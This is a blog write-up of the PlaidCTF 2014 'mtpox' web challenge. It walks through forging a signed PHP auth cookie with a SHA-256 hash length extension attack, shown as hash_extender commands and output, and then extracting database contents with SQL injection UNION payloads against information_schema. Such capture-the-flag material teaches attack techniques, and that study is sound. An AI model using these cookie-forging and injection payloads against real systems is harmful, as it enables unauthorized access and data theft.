---
layout: post
title: "PlaidCTF 2014: mtpox"
date: 2014-04-14 05:13:12 +0000
permalink: /blog/plaidctf-mtpox/
category: Security
tags: PlaidCTF,Security,CTF,Cryptography
---
**150 Point Web Challenge**
> The Plague has traveled back in time to create a cryptocurrency before Satoshi does in an attempt to quickly gain the resources required for his empire. As you step out of your time machine, you learn his exchange has stopped trades, due to some sort of bug. However, if you could break into the database and show a different story of where the coins went, we might be able to stop The Plague.

Looking at the webapp, we discover two pages of content, and a link to an admin page, but visiting the admin page gives an "Access Denied."  Looking at our cookies, we get one <code>auth</code> with value <code>b%3A0%3B</code>, which, urldecoded is <code>b:0;</code>.  Since we know this is a PHP app, we can easily recognize this as a serialized false boolean.  The other cookie, <code>hsh</code> has the value <code>ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3</code>.  This value is unchanged regardless of IP, visit time, etc, so it's a pretty safe assumption it's not salted in any way.  GIven the length, we can assume it's SHA-256.  The about page tells us there's an 8 character "salt", but it really seems to be just a static key.

A few quick tries shows that simply modifying the <code>auth</code> or clearing the <code>hsh</code> cookies aren't enough to get access, so I consider a [hash length extension attack](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks).  Unfortunately, appending data to a serialized PHP value is quite useless, the unserialize function stops at the end of the first value, so <code>b:0;b:1;</code> does no good.  (Same with padding in between.)  We need a way to get our true value at the beginning.  I guessed that maybe they're reversing the <code>auth</code> value before doing the hashing.  ***Update:*** *There was, in fact, an arbitrary file read as well, that would allow me to see for certain that it was reversed before hashing.*

So, how to execute the length extension attack?  I have written a python tool for MD5 before, but this is SHA-256, so I could update that, but one of my coworkers has [an awesome tool](https://github.com/iagox86/hash_extender) to do it for a wide variety of hash types, data formats, etc.  I drop the reversed strings into hash_extender and  look for my output:

    % ./hash_extender -d ';0:b' -s ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3 -a ';1:b' -f sha256 -l 8 --out-data-format=html
    Type: sha256
    Secret length: 8
    New signature: 967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1
    New string: %3b0%3ab%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%3b1%3ab

Of course, this string is now backwards, so we need to reverse it, but we need to reverse the decoded version of it.  Trivial python one-liner incoming!

    % python -c "import urllib; print urllib.quote(urllib.unquote('%3b0%3ab%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%3b1%3ab')[::-1])"
    b%3A1%3B%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3A0%3B

Great, so I'll plug that in as the <code>auth</code> cookie, and <code>967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1</code> for <code>hsh</code>, and we're done, right?  Well, it works, but no flag.

We get a box to query for PlaidCoin values, but putting things in redirects to a non-existent page.  So, removing the action so it redirects to the same page works, but finds nothing obvious, until I insert a quote, revealing the SQL Injection flaw.

Let's use MySQL's information_schema virtual database to do some information gathering. We can find out what tables exist with a query like: <code>1=1 UNION SELECT group_concat(table_name) from information_schema.tables WHERE table_schema=database()</code>.  This returns "Wallet 1=1 UNION SELECT group_concat(table_name) from information_schema.tables WHERE table_schema=database() contains plaidcoin_wallets coins."  So, we know there's only one table, plaidcoin_wallets.  Time to find out what columns exist.  <code>1=1 UNION SELECT group_concat(column_name) from information_schema.columns WHERE table_schema=database()</code>.  This reveals 2 columns: id and amount.  

Let's find out what ID contains. <code>1=1 UNION SELECT group_concat(id) from plaidcoin_wallets</code> shows just one wallet, with the name <code>pctf{phpPhPphpPPPphpcoin}</code>.  Turn in the flag, and we're up 150 points!

*Big thanks to Ron at [skullsecurity.org](http://skullsecurity.org) for the great write-up and tool for hash length extension attacks.  **Update**: Apparently Ron has written this one up as well, see [here](https://blog.skullsecurity.org/2014/plaidctf-web-150-mtpox-hash-extension-attack) for his writeup.*
